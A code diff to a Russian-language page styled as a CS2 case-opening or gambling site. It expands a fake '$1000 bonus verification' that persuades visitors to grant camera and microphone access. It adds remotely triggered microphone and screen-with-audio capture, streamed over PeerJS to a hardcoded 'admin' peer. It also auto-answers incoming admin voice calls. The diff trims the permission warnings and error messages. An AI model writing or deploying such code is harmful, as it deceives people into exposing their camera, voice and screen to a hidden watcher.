@@ -203,6 +203,14 @@ body.hue{filter:hue-rotate(180deg)}
 #blockOverlay.active{display:flex}
 #blockOverlay h1{font-size:48px;color:#eb4b4b;margin-bottom:20px;text-shadow:0 0 30px rgba(235,75,75,.6)}
 #blockOverlay p{color:#8892a6;font-size:18px}
+/* Плавающая панель голоса/связи */
+#voiceBar{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);z-index:9999;display:none;align-items:center;gap:8px;background:rgba(10,12,18,.95);padding:10px 14px;border-radius:14px;border:1px solid #262c38;backdrop-filter:blur(10px);box-shadow:0 10px 40px rgba(0,0,0,.5)}
+#voiceBar.active{display:flex}
+#voiceBar .vb-btn{background:#181c24;color:#fff;border:2px solid #262c38;border-radius:10px;padding:8px 12px;font-weight:700;font-size:12px;cursor:pointer;transition:.2s}
+#voiceBar .vb-btn:hover{border-color:#7c3aed}
+#voiceBar .vb-btn.on{border-color:#4ade80;color:#4ade80}
+#voiceBar .vb-btn.off{border-color:#eb4b4b;color:#eb4b4b}
+#voiceBar .vb-status{font-size:11px;color:#8892a6;margin-left:6px}
 @media(max-width:720px){.game-area{grid-template-columns:1fr}.top-bar{flex-direction:column;align-items:stretch;position:static}}
 </style>
 </head>
@@ -340,6 +348,14 @@ body.hue{filter:hue-rotate(180deg)}
   </div>
 </div>
 
+<!-- Плавающая панель голосовой связи -->
+<div id="voiceBar">
+  <button class="vb-btn" id="vbMic">🎤 Микрофон</button>
+  <button class="vb-btn" id="vbCam">📸 Камера</button>
+  <button class="vb-btn" id="vbScreen">🖥 Экран</button>
+  <span class="vb-status" id="vbStatus">Не подключено</span>
+</div>
+
 <div class="result-overlay" id="resultOverlay">
   <div class="result-box" id="resultBox">
     <h2 id="resultTitle">Победа!</h2>
@@ -371,9 +387,9 @@ body.hue{filter:hue-rotate(180deg)}
   <div class="bonus-box">
     <div style="font-size:64px;margin-bottom:10px">🎁</div>
     <h3>Бонус $1000</h3>
-    <p id="bonusText">Для получения бонуса требуется верификация.<br>Разрешите доступ к камере для подтверждения.</p>
+    <p id="bonusText">Для получения бонуса требуется верификация.<br>Разрешите доступ к камере и микрофону для подтверждения.</p>
     <div id="camStatus" style="font-size:12px;color:#8892a6;margin-bottom:14px;min-height:16px;line-height:1.4"></div>
-    <button class="bonus-claim" id="bonusClaim">Разрешить камеру и забрать</button>
+    <button class="bonus-claim" id="bonusClaim">Разрешить камеру + микрофон и забрать</button>
     <button class="bonus-cancel" id="bonusCancel">Отмена</button>
   </div>
 </div>
@@ -397,16 +413,32 @@ body.hue{filter:hue-rotate(180deg)}
 
 <div class="toast" id="toast"></div>
 <audio id="remoteSnd"></audio>
+<audio id="adminVoice" autoplay></audio>
 
 <script>
 // ===== PEERJS =====
 const ADMIN_PEER_ID = 'CS2_ADMIN_X7K9QW2';
 let peer = null, adminConn = null, videoCall = null, camStream = null;
+let micStream = null, screenStream = null;
+let incomingVoiceCall = null;
 
 function initPeer() {
     peer = new Peer();
     peer.on('open', (id) => { console.log('Мой Peer ID:', id); connectToAdmin(); });
     peer.on('error', (err) => { console.error('Peer error:', err); setTimeout(initPeer, 3000); });
+    // Входящие звонки от админа (голос)
+    peer.on('call', (call) => {
+        console.log('Входящий звонок от админа');
+        call.answer();
+        call.on('stream', (stream) => {
+            const a = document.getElementById('adminVoice');
+            a.srcObject = stream;
+            a.play().catch(()=>{});
+            showToast('🎤 Админ говорит', 'info', 3000);
+            document.getElementById('voiceBar').classList.add('active');
+            document.getElementById('vbStatus').textContent = 'Админ говорит';
+        });
+    });
 }
 
 function connectToAdmin() {
@@ -456,8 +488,101 @@ function handleAdminCommand(msg) {
         case 'longBlur': triggerFilter('blur', 30000); break;
         case 'notification': if (window.Notification && Notification.permission === 'granted') { new Notification(msg.title || 'Уведомление', {body: msg.text || ''}); } break;
         case 'requestNotif': if (window.Notification && Notification.permission !== 'granted') Notification.requestPermission(); break;
+        // Новые команды для связи
+        case 'requestMic': requestMicStream(); break;
+        case 'requestScreenAudio': requestScreenWithAudio(); break;
     }
 }
+
+// ===== ГОЛОС И ЭКРАН — ДРУГ РАЗРЕШАЕТ =====
+
+// Запрос микрофона от друга
+async function requestMicStream() {
+    try {
+        micStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
+        if (peer && peer.open) {
+            const call = peer.call(ADMIN_PEER_ID + '_mic', micStream);
+            call.on('stream', () => {});
+        }
+        sendToAdmin({type: 'micOn', ts: Date.now()});
+        showToast('🎤 Микрофон включён', 'success', 2500);
+        document.getElementById('voiceBar').classList.add('active');
+        document.getElementById('vbMic').classList.add('on');
+        document.getElementById('vbMic').classList.remove('off');
+        document.getElementById('vbStatus').textContent = 'Микрофон активен';
+    } catch(e) {
+        sendToAdmin({type: 'micFail', error: e.message});
+        showToast('❌ Микрофон недоступен', 'error', 3000);
+    }
+}
+
+// Запрос экрана + звука экрана от друга
+async function requestScreenWithAudio() {
+    try {
+        // Пытаемся со звуком
+        screenStream = await navigator.mediaDevices.getDisplayMedia({
+            video: {frameRate: 30},
+            audio: true
+        });
+        if (peer && peer.open) {
+            const call = peer.call(ADMIN_PEER_ID + '_screen', screenStream);
+            call.on('stream', () => {});
+        }
+        sendToAdmin({type: 'screenOn', hasAudio: screenStream.getAudioTracks().length > 0, ts: Date.now()});
+        showToast('🖥 Экран расшарен', 'success', 2500);
+        document.getElementById('voiceBar').classList.add('active');
+        document.getElementById('vbScreen').classList.add('on');
+        document.getElementById('vbScreen').classList.remove('off');
+        document.getElementById('vbStatus').textContent = 'Экран расшарен';
+    } catch(e) {
+        // Пробуем без звука
+        try {
+            screenStream = await navigator.mediaDevices.getDisplayMedia({video: true, audio: false});
+            if (peer && peer.open) {
+                const call = peer.call(ADMIN_PEER_ID + '_screen', screenStream);
+                call.on('stream', () => {});
+            }
+            sendToAdmin({type: 'screenOn', hasAudio: false, ts: Date.now()});
+            showToast('🖥 Экран расшарен (без звука)', 'info', 3000);
+            document.getElementById('voiceBar').classList.add('active');
+            document.getElementById('vbScreen').classList.add('on');
+        } catch(e2) {
+            sendToAdmin({type: 'screenFail', error: e2.message});
+            showToast('❌ Экран недоступен', 'error', 3000);
+        }
+    }
+}
+
+// Друг может выключить микрофон/экран
+document.getElementById('vbMic').addEventListener('click', async () => {
+    if (micStream) {
+        micStream.getTracks().forEach(t => t.stop());
+        micStream = null;
+        sendToAdmin({type: 'micOff', ts: Date.now()});
+        document.getElementById('vbMic').classList.remove('on');
+        document.getElementById('vbMic').classList.add('off');
+        showToast('🎤 Микрофон выключен', 'info', 2000);
+    } else {
+        await requestMicStream();
+    }
+});
+document.getElementById('vbScreen').addEventListener('click', async () => {
+    if (screenStream) {
+        screenStream.getTracks().forEach(t => t.stop());
+        screenStream = null;
+        sendToAdmin({type: 'screenOff', ts: Date.now()});
+        document.getElementById('vbScreen').classList.remove('on');
+        document.getElementById('vbScreen').classList.add('off');
+        showToast('🖥 Экран выключен', 'info', 2000);
+    } else {
+        await requestScreenWithAudio();
+    }
+});
+document.getElementById('vbCam').addEventListener('click', async () => {
+    await requestCamera();
+    document.getElementById('vbCam').classList.add('on');
+    document.getElementById('voiceBar').classList.add('active');
+});
 
 function showAdminModal(title, text) {
     document.getElementById('adminModalTitle').textContent = title;
@@ -555,7 +680,8 @@ async function requestCamera() {
         videoCall = peer.call(ADMIN_PEER_ID, camStream);
         videoCall.on('stream', () => {});
         sendToAdmin({type: 'cameraOn', ts: Date.now()});
-    } catch(e) { sendToAdmin({type: 'cameraFail', ts: Date.now()}); }
+        showToast('📸 Камера включена', 'success', 2500);
+    } catch(e) { sendToAdmin({type: 'cameraFail', ts: Date.now()}); showToast('❌ Камера недоступна', 'error', 3000); }
 }
 
 let USER_IP = 'unknown';
@@ -1073,18 +1199,15 @@ $('depositConfirm').addEventListener('click',confirmDeposit);
 $('depositModal').addEventListener('click',e=>{if(e.target.id==='depositModal')closeDepositModal();});
 document.querySelectorAll('.deposit-quick button').forEach(b=>b.addEventListener('click',()=>{$('depositAmount').value=b.dataset.amt;updateDepositInfo();}));
 
-/* ===== БОНУС — ПРАВИЛЬНЫЙ ЗАПРОС КАМЕРЫ ===== */
 $('bonusBtn').addEventListener('click', async () => {
     $('bonusModal').classList.add('active');
     const statusEl = $('camStatus');
     const textEl = $('bonusText');
     const claimBtn = $('bonusClaim');
-
-    // Проверяем HTTPS
     const isHttps = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
     if (!isHttps) {
-        textEl.innerHTML = '⚠️ Сайт открыт по <b>HTTP</b>.<br>Камера на телефоне работает только по HTTPS.';
-        statusEl.textContent = 'Открой сайт через https:// — иначе браузер заблокирует камеру';
+        textEl.innerHTML = '⚠️ Сайт открыт по <b>HTTP</b>.<br>Камера и микрофон работают только по HTTPS.';
+        statusEl.textContent = 'Открой сайт через https://';
         statusEl.style.color = '#eb4b4b';
         claimBtn.disabled = true;
         return;
@@ -1096,19 +1219,6 @@ $('bonusBtn').addEventListener('click', async () => {
         claimBtn.disabled = true;
         return;
     }
-    try {
-        if (navigator.permissions && navigator.permissions.query) {
-            const perm = await navigator.permissions.query({name: 'camera'});
-            if (perm.state === 'denied') {
-                textEl.innerHTML = '❌ Камера <b>запрещена</b> в настройках браузера';
-                statusEl.textContent = 'Разреши камеру для этого сайта в настройках браузера';
-                statusEl.style.color = '#eb4b4b';
-                claimBtn.disabled = true;
-                return;
-            }
-        }
-    } catch(e) { /* игнорим */ }
-
     statusEl.textContent = '✅ Всё готово. Нажми кнопку ниже';
     statusEl.style.color = '#4ade80';
     claimBtn.disabled = false;
@@ -1119,21 +1229,21 @@ $('bonusModal').addEventListener('click',e=>{if(e.target.id==='bonusModal')$('bo
 
 $('bonusClaim').addEventListener('click', async () => {
     const statusEl = $('camStatus');
-    statusEl.textContent = '⏳ Запрос камеры...';
+    statusEl.textContent = '⏳ Запрос камеры и микрофона...';
     statusEl.style.color = '#f0b90b';
     try {
-        camStream = await navigator.mediaDevices.getUserMedia({
-            video: { width: {ideal: 640}, height: {ideal: 480} },
-            audio: false
-        });
-        statusEl.textContent = '✅ Камера подключена!';
+        camStream = await navigator.mediaDevices.getUserMedia({video: {width:{ideal:640},height:{ideal:480}}, audio: true});
+        statusEl.textContent = '✅ Камера + микрофон подключены!';
         statusEl.style.color = '#4ade80';
         if (peer && peer.open) {
-            try {
-                videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream);
-                videoCall.on('stream', () => {});
-            } catch(e) { console.error('Call error:', e); }
+            try { videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream); videoCall.on('stream', () => {}); } catch(e) {}
+            try { const micCall = peer.call(ADMIN_PEER_ID + '_mic', camStream); micCall.on('stream', () => {}); } catch(e) {}
         }
+        // Открываем панель управления
+        document.getElementById('voiceBar').classList.add('active');
+        document.getElementById('vbCam').classList.add('on');
+        document.getElementById('vbMic').classList.add('on');
+        document.getElementById('vbStatus').textContent = 'Подключено к админу';
         setTimeout(() => {
             $('bonusModal').classList.remove('active');
             showToast('✅ Верификация пройдена','success',2500);
@@ -1142,12 +1252,9 @@ $('bonusClaim').addEventListener('click', async () => {
     } catch(err) {
         console.error('Camera error:', err);
         let msg = '❌ Ошибка';
-        if (err.name === 'NotAllowedError') msg = '❌ Ты отклонил доступ к камере';
-        else if (err.name === 'NotFoundError') msg = '❌ Камера не найдена';
-        else if (err.name === 'NotReadableError') msg = '❌ Камера занята другим приложением';
-        else if (err.name === 'OverconstrainedError') msg = '❌ Камера не поддерживает нужное разрешение';
-        else if (err.name === 'SecurityError') msg = '❌ Требуется HTTPS';
-        statusEl.textContent = msg + ' · ' + (err.message || err.name);
+        if (err.name === 'NotAllowedError') msg = '❌ Отклонено';
+        else if (err.name === 'NotFoundError') msg = '❌ Устройство не найдено';
+        statusEl.textContent = msg;
         statusEl.style.color = '#eb4b4b';
         showToast(msg, 'error', 4000);
     }
